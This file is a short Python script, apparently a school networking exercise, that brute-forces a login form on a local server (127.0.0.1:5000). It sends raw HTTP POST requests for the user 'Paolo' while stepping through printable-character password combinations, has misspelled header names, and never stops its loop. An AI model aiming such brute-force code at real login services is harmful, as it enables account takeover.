import socket as sck

def increase_pw(pw, last):
    pw[last] += 1 #calculate next pw
    if pw[last] == 255:
        pw[last] = 32
        t = 1
        while (pw[last-t] == 255) and (t <= last):
            pw[last-t] = 32
            t += 1
        if pw[0] == 32:
            last += 1
            pw[last] = 32
        pw[last-t] += 1
    return pw,last

def main():
    #POST request, pdf online = https://github.com/conradis/TPSIT-classi-quinte/blob/main/Lezione_4-HTTP-aa1718.pdf
    client = sck.socket(sck.AF_INET,sck.SOCK_STREAM)
    client.connect(('localhost',5000))
    username = "Paolo"
    
    post = "POST http://127.0.0.1:5000/ HTTP/1.0"
    host = "Host: http://127.0.0.1:5000"
    content_type = "Content_type: application/x-www-form-urlencoded" 

    #bruteforce algorithm
    pw = [32]
    last = len(pw)-1 #last value in pw
    while True: #while pw not right
        pw_right = ""
        for char in pw:
            pw_right += chr(char) #my string = pw string
        body = "name=" + username + "&psw=" + pw_right
        content_lenght = "Content_lenght: " + str(len(body))
        mex = post + "\n" + host + "\n" + content_type + "\n" + content_lenght + "\n\n" + body #POST message
        client.sendall(mex.encode())
        data = client.recv(4096)
        print(data.decode())
        pw, last = increase_pw(pw, last)
    client.close() 

if __name__=="__main__":
    main()
